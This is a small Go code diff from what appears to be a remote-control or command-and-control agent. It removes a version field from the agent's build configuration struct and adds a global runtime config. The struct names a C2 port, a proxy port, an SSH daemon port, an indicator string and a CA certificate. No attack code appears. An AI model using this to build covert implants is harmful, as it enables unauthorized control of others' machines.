@@ -223,7 +223,6 @@ const (
 
 // Config build.json config file
 type Config struct {
-	Version              string `json:"version"`                // agent version
 	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
 	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
 	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
@@ -239,6 +238,9 @@ type Config struct {
 	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
 	CA                   string `json:"ca"`                     // CA cert from server side
 }
+
+// RuntimeConfig read all kinds of runtime parameters from here
+var RuntimeConfig = &Config{}
 
 // SystemInfo agent properties
 type SystemInfo struct {
